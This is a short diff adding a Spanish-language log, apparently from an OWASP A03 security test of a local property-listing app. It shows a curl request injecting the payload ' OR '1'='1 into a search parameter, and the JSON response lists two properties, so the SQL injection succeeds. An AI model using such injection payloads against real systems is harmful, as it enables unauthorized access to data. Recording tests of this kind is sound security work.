@@ -1,0 +1,6 @@
+=== A03 - Inyeccion SQL ===
+Comando: curl -G http://localhost:3000/propiedades/buscar --data-urlencode comuna=' OR '1'='1 --data-urlencode precio_max=999999999
+--- Respuesta ---
+[{"id":1,"propietario_id":1,"titulo":"Depto 2D1B Providencia","descripcion":"Luminoso depto cerca del metro.","comuna":"Providencia","precio":1},{"id":2,"propietario_id":1,"titulo":"Casa 3D2B Ñuñoa","descripcion":"Casa con patio, ideal para familia.","comuna":"Ñuñoa","precio":700000}]
+HTTP_STATUS:200
+
